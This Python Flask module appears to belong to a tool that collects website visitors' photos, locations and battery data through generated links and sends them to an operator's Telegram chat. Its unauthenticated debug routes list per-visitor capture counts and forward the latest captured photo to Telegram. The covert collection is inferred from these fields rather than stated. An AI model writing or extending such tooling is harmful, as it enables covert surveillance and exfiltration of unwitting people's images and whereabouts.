from flask import Blueprint, jsonify
from config import config
from core.storage import load_json, PHOTO_DIR
from core.telegram import send_photo, send_message
import os

bp = Blueprint('diag', __name__)


@bp.route('/ping')
def ping():
    return 'pong', 200


@bp.route('/debug_all')
def debug_all():
    files = sorted(os.listdir(PHOTO_DIR)) if os.path.exists(PHOTO_DIR) else []
    visitors = load_json('visitors.json')
    return jsonify({
        'photos_on_disk': len(files),
        'recent_photos': files[-5:],
        'links': load_json('links.json'),
        'users_count': len(load_json('users.json')),
        'visitors': {
            vid: {
                'photos': v.get('photos', 0),
                'locations': v.get('locations', 0),
                'battery': v.get('battery', 0),
                'generated_by': v.get('generated_by'),
            }
            for vid, v in visitors.items()
        },
        'config': {'chat_id': config['chat_id'], 'website': config['website']},
    })


@bp.route('/test_photo')
def test_photo():
    files = sorted(os.listdir(PHOTO_DIR)) if os.path.exists(PHOTO_DIR) else []
    if not files:
        return jsonify({'error': 'No photos on disk'})
    path = os.path.join(PHOTO_DIR, files[-1])
    ok = send_photo(config['chat_id'], path, '🧪 Test photo')
    return jsonify({
        'file': files[-1],
        'size_bytes': os.path.getsize(path),
        'sent': ok,
        'chat_id': config['chat_id']
    })


@bp.route('/test_send')
def test_send():
    ok = send_message(config['chat_id'], '🧪 Test message', parse_mode=None)
    return jsonify({'sent': ok, 'chat_id': config['chat_id']})